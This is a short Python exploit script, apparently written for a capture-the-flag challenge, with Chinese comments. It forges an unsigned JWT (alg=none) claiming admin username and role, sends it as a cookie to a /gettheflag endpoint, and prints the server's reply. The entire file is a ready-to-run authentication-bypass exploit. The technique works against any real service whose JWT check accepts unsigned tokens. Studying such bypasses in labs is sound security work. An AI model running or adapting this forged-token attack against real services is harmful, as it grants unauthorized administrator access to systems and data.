#!/usr/bin/env python3
# exp.py
# 生成 alg=none 的 JWT（admin）并用 cookie 请求 /gettheflag

import sys
import json
import base64
import requests

def b64url_encode(data: bytes) -> str:
    s = base64.urlsafe_b64encode(data).decode('utf-8')
    return s.rstrip('=')

def make_none_jwt(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    # 对于 alg=none，signature 部分为空，通常表示为 header.payload. （注意尾部的点）
    token = f"{h}.{p}."
    return token

def main():
    target_base = "http://127.0.0.1"  # 默认地址
    if len(sys.argv) > 1:
        target_base = sys.argv[1].rstrip('/')
    url = target_base + "/gettheflag"

    payload = {"username":"admin", "role":"admin"}
    token = make_none_jwt(payload)
    print("[*] forged token:\n", token, "\n")

    cookies = {'token': token}
    try:
        print(f"[*] requesting {url} with cookie 'token' ...")
        r = requests.get(url, cookies=cookies, timeout=10)
        print("[*] HTTP", r.status_code)
        print("=== Response body ===")
        print(r.text)
    except Exception as e:
        print("[!] request failed:", e)

if __name__ == "__main__":
    main()
